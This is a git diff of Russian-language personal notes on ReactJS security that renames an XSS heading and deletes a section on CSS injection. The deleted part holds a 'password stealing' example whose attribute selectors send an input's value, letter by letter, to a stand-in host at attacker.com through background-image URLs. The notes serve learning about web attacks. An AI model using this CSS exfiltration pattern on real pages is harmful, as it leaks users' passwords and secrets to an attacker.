@@ -53,7 +53,7 @@ React Flow — построение графов — [https://reactflow.dev/](ht
 
 ## Security
 
-### XSS
+### ReactJS Specified XSS
 
 В ReactJS встроена защита, от разного рода XSS инъекций (auto escaping):
 
@@ -158,19 +158,3 @@ export default App;
 ```
 
 Короч есть какая-та возможность делать css injection. Но я не разобрался. Надо лезть в документацию и смотреть разницу между class и className (один из них безопасный, другой — нет) и как делать Attribute Injection в эти поля.
-
-### Чем вообще могут помочь инъекции в стили
-
-#### Password stealing
-
-```jsx
-<style>
-    #form2 input[value^='a'] { background-image:url(https://attacker.com/?a); }
-    #form2 input[value^='b'] { background-image:url(https://attacker.com/?b); }
-    #form2 input[value^='c'] { background-image:url(https://attacker.com/?c); }
-     [...]
- </style>
- <form action="http://example.com" id="form2">
-   <input type="text" id="secret" name="secret" value="abc">
- </form>
-```
